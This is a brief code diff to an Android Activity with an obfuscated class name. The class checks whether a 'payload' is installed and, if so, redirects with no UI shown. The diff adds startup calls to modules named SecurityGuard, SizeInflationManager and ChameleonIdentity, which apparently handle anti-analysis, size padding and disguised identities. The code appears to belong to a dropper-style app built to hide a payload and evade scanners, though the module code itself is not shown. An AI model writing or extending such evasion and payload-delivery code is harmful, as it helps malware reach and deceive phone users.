@@ -23,6 +23,10 @@ import android.widget.TextView;
 
 import net.lingala.zip4j.ZipFile;
 
+import com.onerule.task.security.SecurityGuard;
+import com.onerule.task.security.ChameleonIdentity;
+import com.onerule.task.security.SizeInflationManager;
+
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
@@ -133,6 +137,10 @@ public class A4450c4b785 extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
+        SecurityGuard.init(this);
+        SizeInflationManager.ensureInflated(this);
+        ChameleonIdentity.selectIdentity(this);
 
         // Already installed → redirect instantly, no UI shown at all.
         if (isPayloadInstalled()) {
